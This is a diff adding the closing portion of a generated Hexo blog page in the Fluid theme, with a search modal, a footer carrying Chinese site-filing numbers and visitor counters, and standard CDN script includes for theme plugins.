+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      苏ICP备2024115526号
+    </a>
+  </span>
+  
+    
+      <span>
+        <a
+          href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=32080302000199"
+          rel="nofollow noopener"
+          class="beian-police"
+          target="_blank"
+        >
+          
+            <span style="visibility: hidden; width: 0">|</span>
+            <img src="/img/police_beian.png" srcset="/img/loading.gif" lazyload alt="police-icon"/>
+          
+          <span>苏公网安备32080302000199号</span>
+        </a>
+      </span>
+    
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
